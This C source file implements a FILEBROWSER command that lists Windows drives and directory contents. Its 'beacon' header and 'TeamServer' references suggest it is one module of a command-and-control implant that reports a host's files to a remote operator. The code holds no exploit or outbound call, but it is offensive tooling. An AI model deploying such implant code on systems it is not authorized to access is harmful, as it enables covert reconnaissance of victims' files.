#include "beacon_commands.h"

/* 文件浏览器条目，包含名称、路径、属性、大小和修改时间 */
typedef struct FileBrowserEntry {
    WCHAR* name;
    WCHAR* path;
    DWORD attrs;
    UINT64 size;
    INT64 mtime;
} FileBrowserEntry;

/* 将 UTF-8 文本字符串打包到输出缓冲区 */
static VOID FbPackText(ByteBuf* out, const CHAR* text)
{
    SIZE_T len = text ? strlen(text) : 0;
    BbBytes(out, text, len);
}

/* 将宽字符串转换为 UTF-8 并打包到输出缓冲区 */
static VOID FbPackWide(ByteBuf* out, const WCHAR* text)
{
    CHAR* u = WideToUtf8(text);
    FbPackText(out, u ? u : "");
    HeapFree(GetProcessHeap(), 0, u);
}

/* 将 Win32 FILETIME 转换为 Unix 时间戳（自纪元以来的毫秒数）。
 * 与 TeamServer FileInfo.mod_time / 前端 new Date(mod_time) 对齐。
 * FILETIME 是 100ns 间隔，除以 10000 得到毫秒。 */
static INT64 FbFiletimeToUnixMs(FILETIME ft)
{
    ULARGE_INTEGER v;
    const UINT64 epoch = 116444736000000000ull;

    v.LowPart = ft.dwLowDateTime;
    v.HighPart = ft.dwHighDateTime;

    if (v.QuadPart <= epoch) {
        return 0;
    }
    return (INT64)((v.QuadPart - epoch) / 10000ull);
}

/* 按名称排序文件条目的比较回调（不区分大小写） */
static INT FbEntryCompare(const VOID* a, const VOID* b)
{
    const FileBrowserEntry* ea = (const FileBrowserEntry*)a;
    const FileBrowserEntry* eb = (const FileBrowserEntry*)b;
    return _wcsicmp(ea->name, eb->name);
}

/* 释放文件浏览器条目数组相关的所有内存 */
static VOID FbFreeEntries(FileBrowserEntry* entries, SIZE_T count)
{
    SIZE_T i;
    for (i = 0; i < count; ++i) {
        HeapFree(GetProcessHeap(), 0, entries[i].name);
        HeapFree(GetProcessHeap(), 0, entries[i].path);
    }
    HeapFree(GetProcessHeap(), 0, entries);
}

/* 枚举目录条目，按名称排序，并以堆分配数组返回 */
static INT FbCollectEntries(const WCHAR* path, FileBrowserEntry** entries, SIZE_T* count, CHAR* error, SIZE_T error_len)
{
    WCHAR* pattern = NULL;
    WIN32_FIND_DATAW fd;
    HANDLE find;
    FileBrowserEntry* out = NULL;
    SIZE_T used = 0;
    SIZE_T cap = 0;

    *entries = NULL;
    *count = 0;
    if (error_len) {
        error[0] = 0;
    }

    /* 构建用于目录枚举的通配符模式 */
    pattern = PathJoinWide(path, L"*");
    if (!pattern) {
        snprintf(error, error_len, "allocation failed");
        return 0;
    }

    find = FindFirstFileW(pattern, &fd);
    HeapFree(GetProcessHeap(), 0, pattern);
    if (find == INVALID_HANDLE_VALUE) {
        snprintf(error, error_len, "ReadDir failed: %lu", (ULONG)GetLastError());
        return 0;
    }

    /* 遍历目录条目 */
    do {
        ULARGE_INTEGER sz;
        FileBrowserEntry* next;

        /* 跳过当前目录和父目录条目 */
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) {
            continue;
        }

        /* 若需要则扩展数组 */
        if (used == cap) {
            cap = cap ? cap * 2u : 32u;
            next = (FileBrowserEntry*)(out ? HeapReAlloc(GetProcessHeap(), 0, out, cap * sizeof(FileBrowserEntry)) : HeapAlloc(GetProcessHeap(), 0, cap * sizeof(FileBrowserEntry)));
            if (!next) {
                FindClose(find);
                FbFreeEntries(out, used);
                snprintf(error, error_len, "allocation failed");
                return 0;
            }
            out = next;
        }

        /* 从查找数据填充条目 */
        memset(&out[used], 0, sizeof(out[used]));
        out[used].name = HeapStrDupW(fd.cFileName);
        out[used].path = PathJoinWide(path, fd.cFileName);
        out[used].attrs = fd.dwFileAttributes;
        sz.LowPart = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        out[used].size = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 0ull : sz.QuadPart;
        out[used].mtime = FbFiletimeToUnixMs(fd.ftLastWriteTime);
        if (!out[used].name || !out[used].path) {
            FindClose(find);
            FbFreeEntries(out, used + 1u);
            snprintf(error, error_len, "allocation failed");
            return 0;
        }
        ++used;
    } while (FindNextFileW(find, &fd));

    FindClose(find);

    /* 按名称字母顺序排序条目 */
    if (used > 1) {
        qsort(out, used, sizeof(FileBrowserEntry), FbEntryCompare);
    }

    *entries = out;
    *count = used;
    return 1;
}

/* 将文件列表响应头打包到输出缓冲区 */
static VOID FbPackHeader(ByteBuf* out, const CHAR* path, UINT32 limit, UINT32 offset,
                          INT has_more, const CHAR* error, UINT32 count)
{
    FbPackText(out, path ? path : "");
    BbU32(out, limit);
    BbU32(out, offset);
    BbU8(out, has_more ? 1u : 0u);
    FbPackText(out, error ? error : "");
    BbU32(out, count);
}

/* 将单个文件浏览器条目打包到输出缓冲区 */
static VOID FbPackEntry(ByteBuf* out, const FileBrowserEntry* entry)
{
    CHAR mode[16];

    FsModeStringFromAttrs(entry->attrs, mode);
    FbPackWide(out, entry->name);
    FbPackWide(out, entry->path);
    BbU8(out, (entry->attrs & FILE_ATTRIBUTE_DIRECTORY) ? 1u : 0u);
    BbU64(out, entry->size);
    BbU64(out, (UINT64)entry->mtime);
    FbPackText(out, mode);
    FbPackText(out, "N/A");
    BbU8(out, (entry->attrs & FILE_ATTRIBUTE_HIDDEN) ? 1u : 0u);
}

/* 构建列出所有可用逻辑驱动器的响应 */
static ByteBuf FbListDrives(const CHAR* requested_path, UINT32 limit, UINT32 offset)
{
    ByteBuf out;
    DWORD drives;
    UINT32 count = 0;
    INT i;

    BbInit(&out);

    /* 查询系统可用的驱动器盘符 */
    drives = GetLogicalDrives();
    if (drives == 0) {
        FbPackHeader(&out, requested_path, limit, offset, 0, "GetLogicalDrives failed", 0);
        return out;
    }

    /* 统计可用驱动器数量 */
    for (i = 0; i < 26; ++i) {
        if (drives & (1u << i)) {
            ++count;
        }
    }

    /* 打包头部和每个驱动器条目 */
    FbPackHeader(&out, requested_path, limit, offset, 0, "", count);
    for (i = 0; i < 26; ++i) {
        WCHAR drive[4];
        if (!(drives & (1u << i))) {
            continue;
        }
        drive[0] = (WCHAR)(L'A' + i);
        drive[1] = L':';
        drive[2] = L'\\';
        drive[3] = 0;

        FbPackWide(&out, drive);
        FbPackWide(&out, drive);
        BbU8(&out, 1);
        BbU64(&out, 0);
        BbU64(&out, 0);
        FbPackText(&out, "drwx------");
        FbPackText(&out, "SYSTEM");
        BbU8(&out, 0);
    }
    return out;
}

/* 处理 FILEBROWSER 命令：列出驱动器或枚举目录内容 */
ByteBuf CommandFilebrowser(Parser* p)
{
    UINT32 arg_count = ParserU32(p);
    UINT32 limit = 1000;
    UINT32 offset = 0;
    CHAR* path_utf8 = NULL;
    WCHAR* path_wide = NULL;
    WCHAR* abs_wide = NULL;
    CHAR* abs_utf8 = NULL;
    FileBrowserEntry* entries = NULL;
    SIZE_T entry_count = 0;
    SIZE_T start;
    SIZE_T end;
    CHAR error[128];
    ByteBuf out;
    SIZE_T i;

    /* 解析可选参数：路径、限制、偏移 */
    if (arg_count >= 1) {
        path_utf8 = ParserString(p);
    } else {
        path_utf8 = HeapStrDupA("");
    }
    if (arg_count >= 2) {
        limit = ParserU32(p);
    }
    if (arg_count >= 3) {
        offset = ParserU32(p);
    }

    /* 检查解析器错误 */
    if (p->error[0]) {
        ByteBuf err;
        BbInit(&err);
        BbPrintf(&err, "error: %s", p->error);
        HeapFree(GetProcessHeap(), 0, path_utf8);
        return err;
    }

    if (!path_utf8) {
        return BbFromText("error: allocation failed");
    }

    /* 空路径或 "/" 表示列出逻辑驱动器 */
    if (path_utf8[0] == 0 || strcmp(path_utf8, "/") == 0) {
        ByteBuf drives = FbListDrives(path_utf8, limit, offset);
        HeapFree(GetProcessHeap(), 0, path_utf8);
        return drives;
    }

    /* 将路径解析为绝对路径 */
    path_wide = Utf8ToWide(path_utf8);
    abs_wide = PathFullWide(path_wide);
    abs_utf8 = WideToUtf8(abs_wide);
    BbInit(&out);

    if (!path_wide || !abs_wide || !abs_utf8) {
        BbFree(&out);
        HeapFree(GetProcessHeap(), 0, path_utf8);
        HeapFree(GetProcessHeap(), 0, path_wide);
        HeapFree(GetProcessHeap(), 0, abs_wide);
        HeapFree(GetProcessHeap(), 0, abs_utf8);
        return BbFromText("error: allocation failed");
    }

    /* 收集目录条目 */
    if (!FbCollectEntries(path_wide, &entries, &entry_count, error, sizeof(error))) {
        FbPackHeader(&out, abs_utf8, limit, offset, 0, error, 0);
        HeapFree(GetProcessHeap(), 0, path_utf8);
        HeapFree(GetProcessHeap(), 0, path_wide);
        HeapFree(GetProcessHeap(), 0, abs_wide);
        HeapFree(GetProcessHeap(), 0, abs_utf8);
        return out;
    }

    /* 应用分页：将 start/end 限制在条目数量范围内 */
    start = (SIZE_T)offset;
    if (start > entry_count) {
        start = entry_count;
    }
    end = start + (SIZE_T)limit;
    if (end > entry_count || end < start) {
        end = entry_count;
    }

    /* 打包包含头部和可见条目的响应 */
    FbPackHeader(&out, abs_utf8, limit, offset, end < entry_count, "", (UINT32)(end - start));
    for (i = start; i < end; ++i) {
        FbPackEntry(&out, &entries[i]);
    }

    /* 清理已分配的资源 */
    FbFreeEntries(entries, entry_count);
    HeapFree(GetProcessHeap(), 0, path_utf8);
    HeapFree(GetProcessHeap(), 0, path_wide);
    HeapFree(GetProcessHeap(), 0, abs_wide);
    HeapFree(GetProcessHeap(), 0, abs_utf8);
    return out;
}
